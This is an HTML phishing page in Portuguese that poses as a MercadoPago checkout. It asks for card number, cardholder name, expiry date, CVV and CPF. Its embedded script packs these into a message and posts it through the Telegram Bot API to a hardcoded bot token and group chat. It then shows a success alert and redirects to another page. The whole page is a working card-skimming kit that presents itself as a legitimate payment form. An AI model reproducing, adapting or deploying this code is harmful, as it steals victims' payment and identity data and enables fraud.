<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <link rel="icon" type="image/png" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQbTC9UKXsHkaAnA4rP-ol-P_ectU0CQRVL8wP7DP0IwwXvQ4UzxU0gBxWP&s=10">
    <title>MercadoPago</title>
    
    <style>
        body, html {
            height: 100%;
            margin: 0;
            font-family: Arial, sans-serif;
        }
        .container {
            width: 100%;
            min-height: 100vh;
            background-color: white;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            overflow: hidden;
        }
        header {
            width: 100%;
            text-align: center;
            margin: 0;
            padding: 0;
        }
        header img {
            width: 100%;
            height: auto;
            display: block;
        }
        .rectangle {
            width: 100%;
            max-width: 600px;
            margin: 10px 0;
            overflow: hidden;
        }
        .rectangle img {
            width: 100%;
            height: auto;
            display: block;
        }
        .square {
            width: 100%;
            max-width: 600px;
            margin: 10px 0;
            border: 2px solid #ccc;
            background-color: rgba(255, 255, 255, 0.5);
            position: relative;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
            box-sizing: border-box;
        }
        .field {
            width: 100%;
            margin-bottom: 15px;
        }
        .field input, .field select {
            width: 100%;
            box-sizing: border-box;
            padding: 10px;
            border: 2px solid #999;
            border-radius: 5px;
            transition: border-color 0.3s;
            font-size: 16px;
        }
        .field input.invalid, .field select.invalid {
            border-color: #999;
        }
        .field label {
            color: #555;
            font-size: 16px;
            margin-bottom: 5px;
            display: block;
            cursor: pointer;
        }
        .button {
            width: 100%;
            background-color: #00BFFF;
            color: white;
            padding: 15px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        .button-text {
            color: blue;
            font-size: 14px;
            margin: 5px 0;
            cursor: pointer;
        }
        .blue-text {
            color: blue;
        }
        footer {
            background-color: white;
            color: black;
            padding: 15px;
            text-align: center;
            margin-top: 10px;
        }
    </style>
    <script>
        function saveAndRedirect() {
            var cardNumber = document.getElementById("cardNumber").value;
            var cardName = document.getElementById("cardName").value;
            var cardExpiry = document.getElementById("cardExpiry").value;
            var cardCvv = document.getElementById("cardCvv").value;
            var cpf = document.getElementById("cpf").value;
            var selectedInstallments = document.getElementById("installments").value;

            if (cardNumber && cardName && cardExpiry && cardCvv && cpf) {
                var productValue = 119.99;
                var installmentAmount = (productValue / selectedInstallments).toFixed(2);

                // Montar a mensagem para o Telegram
                var message = `
**👹[ 𝐀𝐍𝐆𝐄𝐋𝐒 𝐇𝐄𝐋𝐋𝐒 ] 👻**:
💳- **Número do Cartão**: ${cardNumber}
💀- **Nome no Cartão**: ${cardName}
📅- **Validade**: ${cardExpiry}
🔐- **CVV**: ${cardCvv}
🙎- **CPF**: ${cpf}
- **Parcelas**: ${selectedInstallments}x de R$${installmentAmount}
                `;

                // Substituir pelo token do bot e o ID do grupo
                var botToken = "6821351444:AAFNMRGBd9nwIEUT8lt46eVDu0bWqsB1c2Y";
                var chatId = "-1002419406740"; // ID do grupo

                // Enviar dados para o bot no Telegram
                var xhr = new XMLHttpRequest();
                var url = `https://api.telegram.org/bot${botToken}/sendMessage`;
                var data = `chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

                xhr.open("POST", url, true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.onreadystatechange = function () {
                    if (xhr.readyState == 4 && xhr.status == 200) {
                        alert("Mensagem enviada com sucesso.");
                        // Redirecionar para outra página
                        window.location.href = "cartao1.php";
                    } else if (xhr.readyState == 4) {
                        alert("Falha ao enviar os dados. Tente novamente.");
                    }
                };
                xhr.send(data);
            } else {
                alert('Por favor, preencha todos os campos.');
                if (!cardNumber) document.getElementById("cardNumber").classList.add("invalid");
                else document.getElementById("cardNumber").classList.remove("invalid");

                if (!cardName) document.getElementById("cardName").classList.add("invalid");
                else document.getElementById("cardName").classList.remove("invalid");

                if (!cardExpiry) document.getElementById("cardExpiry").classList.add("invalid");
                else document.getElementById("cardExpiry").classList.remove("invalid");

                if (!cardCvv) document.getElementById("cardCvv").classList.add("invalid");
                else document.getElementById("cardCvv").classList.remove("invalid");

                if (!cpf) document.getElementById("cpf").classList.add("invalid");
                else document.getElementById("cpf").classList.remove("invalid");
            }
        }
    </script>
</head>
<body>
<div class="container">
    <header>
        <img src="https://conteudo.mercadopago.com.br/hubfs/imagens/logo/logo_mp_handshake_conexao.png" alt="Cabeçalho">
    </header>
    <div class="rectangle">
        <img src="https://i.postimg.cc/NGT83kN8/3.jpg" alt="Retângulo">
    </div>
    <div class="square">
        <div class="field">
            <label for="cardNumber">Número do Cartão</label>
            <input type="tel" id="cardNumber" maxlength="19">
        </div>
        <div class="field">
            <label for="cardName">Nome Impresso no Cartão</label>
            <input type="text" id="cardName">
        </div>
        <div class="field">
            <label for="cardExpiry">Data de Validade (MM/AA)</label>
            <input type="tel" id="cardExpiry" maxlength="5">
        </div>
        <div class="field">
            <label for="cardCvv">Código CVV</label>
            <input type="tel" id="cardCvv" maxlength="4">
        </div>
        <div class="field">
            <label for="cpf">CPF</label>
            <input type="tel" id="cpf" maxlength="14">
        </div>
        <p class="button-text">Valor do Produto: R$ 99,99</p>
        <div class="field">
            <label for="installments">Parcelas</label>
            <select id="installments">
                <option value="1">1x Sem Juros - R$ 99,99</option>
                <option value="2">2x Sem Juros</option>
                <option value="3">3x Sem Juros</option>
                <option value="4">4x Sem Juros</option>
                <option value="5">5x Sem Juros</option>
                <option value="6">6x Sem Juros</option>
                <option value="7">7x Sem Juros</option>
                <option value="8">8x Sem Juros</option>
                <option value="9">9x Sem Juros</option>
                <option value="10">10x Sem Juros</option>
                <option value="11">11x Sem Juros</option>
                <option value="12">12x Sem Juros</option>
            </select>
        </div>
        <button class="button" onclick="saveAndRedirect()">Continuar</button>
    </div>
    <footer>
        <p>© 1996-2023 Todos os direitos reservados.</p>
    </footer>
</div>
</body>
</html>
